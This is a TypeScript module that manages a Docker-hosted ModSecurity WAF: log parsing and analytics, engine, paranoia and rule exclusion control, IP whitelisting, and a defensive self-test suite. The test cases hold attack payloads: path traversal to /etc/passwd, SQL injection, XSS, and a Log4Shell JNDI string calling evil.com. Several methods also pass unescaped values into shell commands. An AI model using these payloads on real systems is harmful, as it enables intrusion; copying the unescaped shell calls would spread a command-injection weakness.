import { exec as execCb } from "node:child_process";
import { promisify } from "node:util";

const execAsync = promisify(execCb);
import { readFileSync, writeFileSync, existsSync } from "node:fs";
import { resolve } from "node:path";
import { getConfig, type WAFConfig } from "./config.js";
import { logger } from "./logger.js";
import type {
  WAFEngine,
  WAFStatus,
  WAFEvent,
  WAFOverview,
  WAFTopIP,
  WAFTopRule,
  WAFFPCandidate,
  WAFEventSummary,
  WAFEventByRule,
  WAFEventDetail,
  WAFRuleMatch,
  IPInfo,
  CommandResult,
} from "./types.js";

export default class WAFManager {
  private config: WAFConfig;
  private cachedContainer: string | null = null;
  private ipCache: Map<string, IPInfo | null> = new Map();
  private static readonly IP_CACHE_MAX = 5000;

  // Event cache with TTL
  private eventCache: WAFEvent[] | null = null;
  private eventCacheTime: number = 0;
  private static readonly CACHE_TTL_MS = 30_000;

  constructor() {
    this.config = getConfig();
  }

  // ---------------------------------------------------------------------------
  // Shell execution
  // ---------------------------------------------------------------------------

  private async exec(command: string): Promise<CommandResult> {
    try {
      const { stdout } = await execAsync(command, {
        encoding: "utf-8",
        timeout: 30_000,
        maxBuffer: 100 * 1024 * 1024, // 100 MB — docker logs can be large
        cwd: this.config.composeDir,
      });
      return { success: true, output: stdout.trim() };
    } catch (err: unknown) {
      const message =
        err instanceof Error ? err.message : String(err);
      logger.error(`Command failed: ${command}\n${message}`);
      return { success: false, output: message };
    }
  }

  // ---------------------------------------------------------------------------
  // Container discovery
  // ---------------------------------------------------------------------------

  private async findContainer(): Promise<string> {
    if (this.cachedContainer) {
      return this.cachedContainer;
    }

    const result = await this.exec(
      `docker ps --format '{{.Names}}' | grep -i ${this.config.containerPattern} | head -1`,
    );

    if (!result.success || !result.output) {
      throw new Error("No running ModSecurity container found");
    }

    this.cachedContainer = result.output;
    logger.debug(`Found container: ${this.cachedContainer}`);
    return this.cachedContainer;
  }

  // ---------------------------------------------------------------------------
  // Status
  // ---------------------------------------------------------------------------

  async getStatus(): Promise<WAFStatus> {
    const container = await this.findContainer();

    const composeFile = resolve(this.config.composeDir, this.config.composeFile);
    const composeContent = readFileSync(composeFile, "utf-8");

    // Engine mode
    const engineMatch = composeContent.match(/MODSEC_RULE_ENGINE=(\S+)/);
    const engine = (engineMatch?.[1] ?? "On") as WAFEngine;

    // Paranoia levels from docker logs
    const logsResult = await this.exec(
      `docker logs ${container} 2>&1 | grep 'PARANOIA' | tail -1`,
    );
    let paranoiaLevel = 1;
    let blockingParanoia = 1;
    if (logsResult.success && logsResult.output) {
      const plMatch = logsResult.output.match(/Paranoia Level:\s*(\d)/i);
      const bpMatch = logsResult.output.match(/Blocking Paranoia:\s*(\d)/i);
      if (plMatch) paranoiaLevel = parseInt(plMatch[1], 10);
      if (bpMatch) blockingParanoia = parseInt(bpMatch[1], 10);

      // Fallback: if the log line is just "PARANOIA=N"
      if (!plMatch) {
        const simpleMatch = logsResult.output.match(/PARANOIA=(\d)/);
        if (simpleMatch) paranoiaLevel = parseInt(simpleMatch[1], 10);
      }
    }

    // Fallback paranoia from compose
    if (paranoiaLevel === 1) {
      const composeParanoia = composeContent.match(/PARANOIA=(\d+)/);
      if (composeParanoia) paranoiaLevel = parseInt(composeParanoia[1], 10);
    }
    if (blockingParanoia === 1) blockingParanoia = paranoiaLevel;

    // Rules loaded
    const rulesResult = await this.exec(
      `docker logs ${container} 2>&1 | grep -oP 'rules loaded inline/local/remote: \\K[0-9/]+' | tail -1`,
    );
    const rulesLoaded = rulesResult.success ? rulesResult.output || "unknown" : "unknown";

    // Health check
    const healthResult = await this.exec(
      `docker ps --filter "name=${container}" --format '{{.Status}}'`,
    );
    const healthy = healthResult.success && healthResult.output.toLowerCase().includes("up");

    return {
      container,
      healthy,
      engine,
      rulesLoaded,
      paranoiaLevel,
      blockingParanoia,
    };
  }

  // ---------------------------------------------------------------------------
  // Event parsing with cache
  // ---------------------------------------------------------------------------

  private async getAllEvents(): Promise<WAFEvent[]> {
    const now = Date.now();
    if (this.eventCache && (now - this.eventCacheTime) < WAFManager.CACHE_TTL_MS) {
      return this.eventCache;
    }

    const container = await this.findContainer();
    const result = await this.exec(
      `docker logs --since ${this.config.logsSince} ${container} 2>&1 | grep '^{"transaction"'`,
    );

    if (!result.success || !result.output) {
      this.eventCache = [];
      this.eventCacheTime = now;
      return [];
    }

    const events: WAFEvent[] = [];
    const lines = result.output.split("\n");

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      if (!line.trim()) continue;
      try {
        const parsed = JSON.parse(line);
        const t = parsed.transaction;
        if (!t) continue;

        const sourceIp =
          t.request?.headers?.["X-Real-Ip"] ??
          t.request?.headers?.["x-real-ip"] ??
          t.client_ip ??
          "unknown";

        const rules: WAFRuleMatch[] = [];
        if (Array.isArray(t.messages)) {
          for (const msg of t.messages) {
            rules.push({
              id: String(msg.details?.ruleId ?? "unknown"),
              message: String(msg.message ?? ""),
              severity: String(msg.details?.severity ?? "UNKNOWN"),
              matchedData: String(msg.details?.data ?? "").slice(0, 1000),
            });
          }
        }

        events.push({
          index: i,
          timestamp: t.time_stamp ?? "",
          method: t.request?.method ?? "?",
          uri: t.request?.uri ?? "?",
          sourceIp,
          httpCode: t.response?.http_code ?? 0,
          rules,
          _raw: t,
        });
      } catch {
        logger.debug(`Failed to parse WAF event line: ${line.slice(0, 100)}`);
      }
    }

    // Re-index after filtering out parse failures
    for (let i = 0; i < events.length; i++) {
      events[i].index = i;
    }

    this.eventCache = events;
    this.eventCacheTime = now;
    return events;
  }

  // ---------------------------------------------------------------------------
  // Analysis: Overview
  // ---------------------------------------------------------------------------

  async getOverview(): Promise<WAFOverview> {
    const events = await this.getAllEvents();

    const uniqueIPs = new Set<string>();
    const uniqueRules = new Set<string>();
    let eventsLastHour = 0;

    const oneHourAgo = new Date(Date.now() - 3600_000);

    for (const event of events) {
      uniqueIPs.add(event.sourceIp);
      for (const rule of event.rules) {
        uniqueRules.add(rule.id);
      }
      // Parse timestamp — ModSecurity uses format like "Wed Oct 25 14:30:00 2023"
      try {
        const eventDate = new Date(event.timestamp);
        if (!isNaN(eventDate.getTime()) && eventDate >= oneHourAgo) {
          eventsLastHour++;
        }
      } catch {
        // skip unparseable timestamps
      }
    }

    return {
      totalEvents: events.length,
      uniqueIPs: uniqueIPs.size,
      uniqueRules: uniqueRules.size,
      eventsLastHour,
    };
  }

  // ---------------------------------------------------------------------------
  // Analysis: Top IPs
  // ---------------------------------------------------------------------------

  async getTopIPs(count: number = 10): Promise<WAFTopIP[]> {
    const events = await this.getAllEvents();

    const ipData = new Map<string, { count: number; lastSeen: string }>();

    for (const event of events) {
      const existing = ipData.get(event.sourceIp);
      if (existing) {
        existing.count++;
        existing.lastSeen = event.timestamp; // events are chronological, last one wins
      } else {
        ipData.set(event.sourceIp, { count: 1, lastSeen: event.timestamp });
      }
    }

    const sorted = [...ipData.entries()]
      .sort((a, b) => b[1].count - a[1].count)
      .slice(0, count);

    const results: WAFTopIP[] = [];
    for (const [ip, data] of sorted) {
      const geoInfo = await this.ipLookup(ip);
      const geo = geoInfo
        ? [geoInfo.city, geoInfo.country, geoInfo.org].filter(Boolean).join(", ")
        : null;
      results.push({
        ip,
        count: data.count,
        geo,
        lastSeen: data.lastSeen,
      });
    }

    return results;
  }

  // ---------------------------------------------------------------------------
  // Analysis: Top Rules
  // ---------------------------------------------------------------------------

  async getTopRules(count: number = 10): Promise<WAFTopRule[]> {
    const events = await this.getAllEvents();

    const ruleData = new Map<string, { count: number; severity: string; message: string }>();

    for (const event of events) {
      for (const rule of event.rules) {
        const existing = ruleData.get(rule.id);
        if (existing) {
          existing.count++;
        } else {
          ruleData.set(rule.id, {
            count: 1,
            severity: rule.severity,
            message: rule.message,
          });
        }
      }
    }

    return [...ruleData.entries()]
      .sort((a, b) => b[1].count - a[1].count)
      .slice(0, count)
      .map(([ruleId, data]) => ({
        ruleId,
        count: data.count,
        severity: data.severity,
        message: data.message,
      }));
  }

  // ---------------------------------------------------------------------------
  // Analysis: False Positive Candidates
  // ---------------------------------------------------------------------------

  async getFPCandidates(): Promise<WAFFPCandidate[]> {
    const events = await this.getAllEvents();

    const fpData = new Map<string, { count: number; message: string }>();

    for (const event of events) {
      if (event.httpCode >= 200 && event.httpCode < 300 && event.rules.length > 0) {
        for (const rule of event.rules) {
          const existing = fpData.get(rule.id);
          if (existing) {
            existing.count++;
          } else {
            fpData.set(rule.id, { count: 1, message: rule.message });
          }
        }
      }
    }

    return [...fpData.entries()]
      .sort((a, b) => b[1].count - a[1].count)
      .map(([ruleId, data]) => ({
        ruleId,
        count: data.count,
        message: data.message,
      }));
  }

  // ---------------------------------------------------------------------------
  // Analysis: Events by IP
  // ---------------------------------------------------------------------------

  async getEventsByIP(ip: string, count: number = 20): Promise<(WAFEventSummary & { index: number })[]> {
    const events = await this.getAllEvents();

    return events
      .filter((e) => e.sourceIp === ip)
      .slice(-count)
      .map((e) => ({
        index: e.index,
        timestamp: e.timestamp,
        method: e.method,
        uri: e.uri,
        httpCode: e.httpCode,
        rules: e.rules,
      }));
  }

  // ---------------------------------------------------------------------------
  // Analysis: Events by Rule
  // ---------------------------------------------------------------------------

  async getEventsByRule(ruleId: string, count: number = 20): Promise<(WAFEventByRule & { index: number })[]> {
    const events = await this.getAllEvents();

    return events
      .filter((e) => e.rules.some((r) => r.id === ruleId))
      .slice(-count)
      .map((e) => {
        const matchedRule = e.rules.find((r) => r.id === ruleId);
        return {
          index: e.index,
          timestamp: e.timestamp,
          ip: e.sourceIp,
          method: e.method,
          uri: e.uri,
          httpCode: e.httpCode,
          matchedData: matchedRule?.matchedData ?? "",
        };
      });
  }

  // ---------------------------------------------------------------------------
  // Analysis: Event Detail
  // ---------------------------------------------------------------------------

  async getEventDetail(index: number, verbose: boolean = false): Promise<WAFEventDetail> {
    const events = await this.getAllEvents();

    if (index < 0 || index >= events.length) {
      throw new Error(`Event index ${index} out of range (0-${events.length - 1})`);
    }

    const event = events[index];
    const raw = event._raw as Record<string, unknown> | undefined;

    // Extract full headers
    const requestHeaders: Record<string, string> = {};
    const rawHeaders = (raw?.request as Record<string, unknown>)?.headers;
    if (rawHeaders && typeof rawHeaders === "object") {
      for (const [k, v] of Object.entries(rawHeaders as Record<string, unknown>)) {
        requestHeaders[k] = String(v);
      }
    }

    // Extract body
    let requestBody = "";
    const rawBody = (raw?.request as Record<string, unknown>)?.body;
    if (typeof rawBody === "string") {
      requestBody = verbose ? rawBody.slice(0, 8000) : rawBody.slice(0, 500);
    }

    // For verbose, re-extract full matchedData from _raw (cached rules are truncated to 1000)
    let rules = event.rules;
    if (verbose && raw) {
      const rawMsgs = (raw as Record<string, unknown>).messages;
      if (Array.isArray(rawMsgs)) {
        rules = rawMsgs.map((msg: Record<string, unknown>) => ({
          id: String((msg.details as Record<string, unknown>)?.ruleId ?? "unknown"),
          message: String(msg.message ?? ""),
          severity: String((msg.details as Record<string, unknown>)?.severity ?? "UNKNOWN"),
          matchedData: String((msg.details as Record<string, unknown>)?.data ?? "").slice(0, 4000),
        }));
      }
    }

    return {
      index: event.index,
      timestamp: event.timestamp,
      sourceIp: event.sourceIp,
      method: event.method,
      uri: event.uri,
      httpCode: event.httpCode,
      requestHeaders,
      requestBody,
      rules,
    };
  }

  // ---------------------------------------------------------------------------
  // Engine control
  // ---------------------------------------------------------------------------

  async setEngine(mode: WAFEngine): Promise<CommandResult> {
    const container = await this.findContainer();
    const composeFile = resolve(this.config.composeDir, this.config.composeFile);

    // Update docker-compose.yml
    const sedResult = await this.exec(
      `sed -i 's/MODSEC_RULE_ENGINE=.*/MODSEC_RULE_ENGINE=${mode}/' ${composeFile}`,
    );
    if (!sedResult.success) {
      return { success: false, output: `Failed to update compose file: ${sedResult.output}` };
    }

    // Apply immediately via override + reload (no downtime)
    const overrideResult = await this.exec(
      `docker exec ${container} sh -c "echo 'SecRuleEngine ${mode}' > /etc/modsecurity.d/modsecurity-override.conf"`,
    );
    if (!overrideResult.success) {
      return { success: false, output: `Failed to write override: ${overrideResult.output}` };
    }

    const reloadResult = await this.reloadRules();
    if (!reloadResult.success) {
      return { success: false, output: `Failed to reload: ${reloadResult.output}` };
    }

    logger.info(`Engine set to ${mode}`);
    return { success: true, output: `SecRuleEngine set to: ${mode}` };
  }

  // ---------------------------------------------------------------------------
  // Paranoia
  // ---------------------------------------------------------------------------

  async setParanoia(level: number): Promise<CommandResult> {
    if (level < 1 || level > 4) {
      return { success: false, output: "Paranoia level must be between 1 and 4" };
    }

    const composeFile = resolve(this.config.composeDir, this.config.composeFile);
    const content = readFileSync(composeFile, "utf-8");

    const paranoiaMatch = content.match(/PARANOIA=\d+/);
    if (!paranoiaMatch) {
      return { success: false, output: "Could not find PARANOIA setting in compose file" };
    }

    const updated = content.replace(/PARANOIA=\d+/, `PARANOIA=${level}`);
    writeFileSync(composeFile, updated, "utf-8");

    // Recreate container
    const recreateResult = await this.exec(
      "docker compose up -d --force-recreate --no-deps modsecurity",
    );

    // Invalidate container cache since we recreated
    this.cachedContainer = null;

    if (!recreateResult.success) {
      return { success: false, output: `Failed to recreate container: ${recreateResult.output}` };
    }

    logger.info(`Paranoia level set to ${level}`);
    return { success: true, output: `Paranoia level set to ${level}. Container recreated.` };
  }

  // ---------------------------------------------------------------------------
  // Rule management
  // ---------------------------------------------------------------------------

  async disableRule(ruleId: string): Promise<CommandResult> {
    const exclusionsPath = resolve(this.config.composeDir, this.config.exclusionsFile);

    try {
      const existing = existsSync(exclusionsPath)
        ? readFileSync(exclusionsPath, "utf-8")
        : "";

      if (existing.includes(`SecRuleRemoveById ${ruleId}`)) {
        return { success: true, output: `Rule ${ruleId} is already disabled` };
      }

      const addition = `\n# Disabled rule ${ruleId}\nSecRuleRemoveById ${ruleId}\n`;
      writeFileSync(exclusionsPath, existing + addition, "utf-8");
    } catch (err) {
      return { success: false, output: `Failed to write exclusions: ${err}` };
    }

    const reloadResult = await this.reloadRules();
    if (!reloadResult.success) {
      return { success: false, output: `Rule disabled but reload failed: ${reloadResult.output}` };
    }

    logger.info(`Rule ${ruleId} disabled`);
    return { success: true, output: `Rule ${ruleId} disabled` };
  }

  async enableRule(ruleId: string): Promise<CommandResult> {
    const exclusionsPath = resolve(this.config.composeDir, this.config.exclusionsFile);

    if (!existsSync(exclusionsPath)) {
      return { success: false, output: "Exclusions file not found" };
    }

    try {
      let content = readFileSync(exclusionsPath, "utf-8");
      content = content
        .split("\n")
        .filter(
          (line: string) =>
            line.trim() !== `SecRuleRemoveById ${ruleId}` &&
            line.trim() !== `# Disabled rule ${ruleId}`,
        )
        .join("\n");
      writeFileSync(exclusionsPath, content, "utf-8");
    } catch (err) {
      return { success: false, output: `Failed to update exclusions: ${err}` };
    }

    const reloadResult = await this.reloadRules();
    if (!reloadResult.success) {
      return { success: false, output: `Rule enabled but reload failed: ${reloadResult.output}` };
    }

    logger.info(`Rule ${ruleId} re-enabled`);
    return { success: true, output: `Rule ${ruleId} re-enabled` };
  }

  // ---------------------------------------------------------------------------
  // IP management
  // ---------------------------------------------------------------------------

  async allowIP(ip: string): Promise<CommandResult> {
    const exclusionsPath = resolve(this.config.composeDir, this.config.exclusionsFile);

    try {
      const existing = existsSync(exclusionsPath)
        ? readFileSync(exclusionsPath, "utf-8")
        : "";

      // Find next available ID in 90000+ range (reserved for whitelist rules)
      const idMatches = existing.match(/# Whitelist IP [\s\S]*?id:(\d+)/g) ?? [];
      let nextId = 90000;
      for (const m of idMatches) {
        const idMatch = m.match(/id:(\d+)/);
        if (idMatch) {
          const num = parseInt(idMatch[1], 10);
          if (num >= nextId) nextId = num + 1;
        }
      }

      const addition = `\n# Whitelist IP ${ip}\nSecRule REMOTE_ADDR "@ipMatch ${ip}" "id:${nextId},phase:1,allow,nolog,ctl:ruleEngine=Off"\n`;
      writeFileSync(exclusionsPath, existing + addition, "utf-8");
    } catch (err) {
      return { success: false, output: `Failed to write exclusions: ${err}` };
    }

    const reloadResult = await this.reloadRules();
    if (!reloadResult.success) {
      return { success: false, output: `IP whitelisted but reload failed: ${reloadResult.output}` };
    }

    logger.info(`IP ${ip} whitelisted`);
    return { success: true, output: `IP ${ip} whitelisted (WAF bypassed)` };
  }

  async denyIP(ip: string): Promise<CommandResult> {
    const exclusionsPath = resolve(this.config.composeDir, this.config.exclusionsFile);

    if (!existsSync(exclusionsPath)) {
      return { success: true, output: "IP was not whitelisted (exclusions file does not exist)" };
    }

    try {
      let content = readFileSync(exclusionsPath, "utf-8");
      content = content
        .split("\n")
        .filter(
          (line: string) =>
            !line.includes(`@ipMatch ${ip}`) &&
            line.trim() !== `# Whitelist IP ${ip}`,
        )
        .join("\n");
      writeFileSync(exclusionsPath, content, "utf-8");
    } catch (err) {
      return { success: false, output: `Failed to update exclusions: ${err}` };
    }

    const reloadResult = await this.reloadRules();
    if (!reloadResult.success) {
      return { success: false, output: `IP removed but reload failed: ${reloadResult.output}` };
    }

    logger.info(`IP ${ip} removed from whitelist`);
    return { success: true, output: `IP ${ip} removed from whitelist` };
  }

  // ---------------------------------------------------------------------------
  // Reload
  // ---------------------------------------------------------------------------

  private async reloadRules(): Promise<CommandResult> {
    const container = await this.findContainer();
    const result = await this.exec(
      `docker exec ${container} nginx -s reload`,
    );

    if (result.success) {
      logger.info("WAF rules reloaded");
    }

    return result;
  }

  // ---------------------------------------------------------------------------
  // IP lookup
  // ---------------------------------------------------------------------------

  private async ipLookup(ip: string): Promise<IPInfo | null> {
    if (!this.config.ipinfoToken) {
      return null;
    }

    if (this.ipCache.has(ip)) {
      return this.ipCache.get(ip) ?? null;
    }

    if (this.ipCache.size >= WAFManager.IP_CACHE_MAX) {
      this.ipCache.clear();
    }

    try {
      const response = await fetch(
        `https://ipinfo.io/${ip}/json?token=${this.config.ipinfoToken}`,
        { signal: AbortSignal.timeout(2000) },
      );

      if (!response.ok) {
        this.ipCache.set(ip, null);
        return null;
      }

      const data = (await response.json()) as Record<string, string>;
      const info: IPInfo = {
        city: data.city ?? "",
        country: data.country ?? "",
        org: data.org ?? "",
      };

      this.ipCache.set(ip, info);
      return info;
    } catch {
      logger.debug(`IP lookup failed for ${ip}`);
      this.ipCache.set(ip, null);
      return null;
    }
  }

  // ---------------------------------------------------------------------------
  // Test suite
  // ---------------------------------------------------------------------------

  async runTests(): Promise<
    Array<{ name: string; expected: "block" | "pass"; actual: number; passed: boolean }>
  > {
    const domain = this.config.domain;
    const results: Array<{
      name: string;
      expected: "block" | "pass";
      actual: number;
      passed: boolean;
    }> = [];

    const testCases: Array<{
      name: string;
      expected: "block" | "pass";
      curlArgs: string;
    }> = [
      {
        name: "Scanner detection",
        expected: "block",
        curlArgs: `-sk -o /dev/null -w "%{http_code}" -H "User-Agent: nikto" "${domain}/v1/models"`,
      },
      {
        name: "Path traversal",
        expected: "block",
        curlArgs: `-sk -o /dev/null -w "%{http_code}" "${domain}/v1/../../etc/passwd"`,
      },
      {
        name: "SQL injection",
        expected: "block",
        curlArgs: `-sk -o /dev/null -w "%{http_code}" "${domain}/v1/models?id=1%20UNION%20SELECT%20*%20FROM%20users"`,
      },
      {
        name: "XSS",
        expected: "block",
        curlArgs: `-sk -o /dev/null -w "%{http_code}" "${domain}/v1/models?q=%3Cscript%3Ealert(1)%3C/script%3E"`,
      },
      {
        name: "Log4Shell",
        expected: "block",
        curlArgs: `-sk -o /dev/null -w "%{http_code}" -H "X-Api-Key: \\\${jndi:ldap://evil.com/a}" "${domain}/v1/models"`,
      },
      {
        name: "Normal request",
        expected: "pass",
        curlArgs: `-sk -o /dev/null -w "%{http_code}" "${domain}/v1/models"`,
      },
    ];

    for (const tc of testCases) {
      const result = await this.exec(`curl ${tc.curlArgs}`);
      const code = parseInt(result.output, 10) || 0;

      let passed: boolean;
      if (tc.expected === "block") {
        passed = code === 403;
      } else {
        passed = code >= 200 && code < 300 || code === 401;
      }

      results.push({
        name: tc.name,
        expected: tc.expected,
        actual: code,
        passed,
      });
    }

    return results;
  }
}
